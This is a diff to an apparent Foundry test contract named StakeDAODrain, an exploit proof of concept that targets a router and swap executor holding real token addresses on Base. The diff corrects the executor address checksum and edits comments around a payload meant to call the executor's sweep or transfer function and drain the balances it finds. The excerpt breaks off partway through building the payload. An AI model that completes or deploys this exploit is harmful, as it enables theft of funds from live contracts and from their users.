@@ -11,7 +11,9 @@ interface IRouter {
 
 contract StakeDAODrain is Test {
     IRouter constant router = IRouter(0x0f542fA75c871EB1b93Ef881b73e46acF733392f);
-    address constant SWAP_EXECUTOR = 0x591435c065fce9713c8b112fcbf5af98b8975cb3;
+    
+    // FIXED: Correctly Checksummed Address
+    address constant SWAP_EXECUTOR = 0x591435c065fce9713c8B112fcBf5Af98b8975cB3;
 
     address[] TOKENS = [
         0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, // USDC
@@ -44,9 +46,8 @@ contract StakeDAODrain is Test {
         console.log("Balance to drain:", maxBalance);
 
         // 2. Craft payload to call SwapExecutor's sweep/transfer function
-        // The exact function signature depends on the SwapExecutor implementation.
-        // Common functions: sweep(address token, address to), transfer(address token, address to, uint256 amount)
-        // You must verify the exact function on Basescan.
+        // NOTE: The exact function signature depends on the SwapExecutor implementation.
+        // If this reverts, check the SwapExecutor on Basescan for the exact function name.
         bytes memory payload = abi.encodePacked(
             bytes1(uint8(8)), // Module ID 0x08 = RouterModuleEnso
             abi.encodeWithSignature(
